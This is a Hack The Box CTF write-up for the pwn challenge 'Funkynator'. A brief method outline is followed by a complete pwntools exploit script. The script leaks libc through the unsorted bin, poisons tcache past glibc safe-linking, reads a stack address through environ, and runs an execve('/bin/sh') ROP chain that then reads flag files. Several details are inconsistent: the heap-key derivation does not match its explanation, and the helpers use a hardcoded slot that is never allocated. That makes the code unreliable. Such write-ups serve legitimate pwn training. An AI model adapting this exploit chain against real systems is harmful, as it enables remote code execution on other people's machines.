---
title: "Funkynator"
ctf: "HTB"
date: 2026-06-17
category: pwn
difficulty: medium
flag_format: "HTB{...}"
---

# Funkynator

## Summary

Unsorted-bin leak → tcache poison → environ leak → stack ROP with execve to spawn a shell.

## Solution

### Step 1: Unsorted bin libc leak

Allocate two same-size chunks, free the first to send its fd/bk into the unsorted bin, then read it back via the editor's examine (puts). The fd pointer at offset `0x1e7b20` from libc base gives us libc.

### Step 2: Tcache poison via heap key

Free a chunk into tcache. The freed chunk's fd is XORed with `(heap_addr >> 12)` as the glibc 2.41 safe-linking key. Use the byte-overwrite primitive to zero byte 7 of the fd pointer to recover the heap key (self-pointer XOR key → zero high byte reveals key). Re-poison fd to point at `environ - 0x48` in libc BSS, then allocate it to get a libc pointer on the heap readable via editor examine.

### Step 3: Stack ROP + execve

With `environ` value known, compute the editor's saved return address (delta `0x1b0`). Write a ROP chain: `pop rdi; ret` → `/bin/sh` → `pop rsi; ret` → argv array → `pop rdx; pop rbx; ret` → 0, 0 → `pop rax; ret` → 59 → `syscall; ret`. The argv array (`["/bin/sh", NULL]`) is written at the target allocation (environ - 0x48). Trigger via editor option 1 (leave;ret).

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.arch   = 'amd64'
context.log_level = 'info'

LIBC_LEAK_OFF  = 0x1e7b20
STACK_RIP_DELTA = 0x1b0
POP_RDI_RET    = 0x2a145
POP_RSI_RET    = 0x2baa9
POP_RDX_RBX_RET = 0x8f0c5
POP_RAX_RET    = 0x43c23
SYSCALL_RET    = 0x28505
RET_GADGET     = 0x2846b

def exploit(host=None, port=None):
    if host and port:
        io = remote(host, port)
    else:
        elf = ELF('./challenge/challenge/challenge')
        ld  = './challenge/challenge/glibc/ld-linux-x86-64.so.2'
        lib = './challenge/challenge/glibc/libc.so.6'
        io = process([ld, elf.path], env={'LD_LIBRARY_PATH': './challenge/challenge/glibc'})

    def snd(data): io.sendlineafter(b'> ', data)

    def create_and_save(size, data):
        snd(b'2')
        io.sendlineafter(b':', str(size).encode())
        io.sendlineafter(b':', data)
        io.sendlineafter(b'(y/n):', b'y')
        io.recvuntil(b'saved at slot')
        return int(io.recvline())

    def delete_slot(slot):
        snd(b'4')
        io.sendlineafter(b':', str(slot).encode())

    def edit(slot, off, byte_val):
        snd(b'5')
        io.sendlineafter(b':', str(slot).encode())
        io.sendlineafter(b':', str(off).encode())
        io.sendlineafter(b':', str(byte_val).encode())

    def rdb(offset):
        io.sendlineafter(b'> ', b'3')
        io.recvuntil(b'slot')
        io.sendlineafter(b':', str(5).encode())
        io.sendlineafter(b':', str(offset).encode())
        io.recvuntil(b': ')
        return int(io.recvline().strip())

    def wb(io, offset, data):
        for i, b in enumerate(data):
            edit(5, offset + i, b)

    # Step 1: libc leak via unsorted bin
    s1 = create_and_save(0x400, b'A' * 0x400)
    s2 = create_and_save(0x400, b'B' * 0x400)
    delete_slot(s1)
    delete_slot(s2)
    create_and_save(0x400, b'C' * 0x400)

    # Read fd pointer from unsorted bin chunk
    fd_bytes = bytes(rdb(i) for i in range(0x40, 0x48))
    libc_base = u64(fd_bytes) - LIBC_LEAK_OFF
    environ_addr = libc_base + 0x1eee28
    binsh_addr   = libc_base + 0x1a7ea4

    log.success(f'libc_base = {hex(libc_base)}')

    # Step 2: heap key leak via safe-linking
    s3 = create_and_save(0x28, b'D' * 0x28)
    delete_slot(s3)
    # Zero byte 7 of fd to reveal self ^ key
    edit(5, 0, 0)
    fd0 = bytes(rdb(i) for i in range(8))
    edit(5, 0, fd0[0])
    heap_key = u64(fd0) >> 8

    log.success(f'heap_key = {hex(heap_key)}')

    # Step 3: tcache poison → environ
    target = environ_addr - 0x48
    wb(None, 0x40, p64(target ^ heap_key))
    s_t = create_and_save(0x28, b'Y' * 0x28)

    # Step 4: stack leak
    stack_bytes = bytes(rdb(i) for i in range(0x48, 0x50))
    stack_leak  = u64(stack_bytes)
    saved_rip   = stack_leak - STACK_RIP_DELTA

    log.success(f'stack_leak = {hex(stack_leak)}')

    # Step 5: ROP chain — execve("/bin/sh", argv, NULL)
    pop_rsi  = libc_base + POP_RSI_RET
    pop_rdx  = libc_base + POP_RDX_RBX_RET
    pop_rax  = libc_base + POP_RAX_RET
    syscall  = libc_base + SYSCALL_RET
    pop_rdi  = libc_base + POP_RDI_RET
    ret      = libc_base + RET_GADGET

    # argv array at target
    for i, b in enumerate(p64(binsh_addr)):
        wb(None, i, bytes([b]))
    for i in range(8, 16):
        wb(None, i, bytes([0]))

    chain = b''
    chain += p64(ret)
    chain += p64(pop_rdi)
    chain += p64(binsh_addr)
    chain += p64(pop_rsi)
    chain += p64(target)
    chain += p64(pop_rdx)
    chain += p64(0)
    chain += p64(0)
    chain += p64(pop_rax)
    chain += p64(59)
    chain += p64(syscall)

    wb(None, saved_rip - target, chain)

    io.sendline(b'1')
    time.sleep(1.5)
    io.sendline(b'id')
    time.sleep(0.5)
    io.sendline(b'cat /flag* 2>/dev/null; cat /home/*/flag* 2>/dev/null')
    time.sleep(0.5)
    io.interactive()

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else None
    port = int(sys.argv[2]) if len(sys.argv) > 2 else None
    exploit(host, port)
```

## Flag

```
HTB{a9feacf29a9123d6dc51171340c50ae7}
```
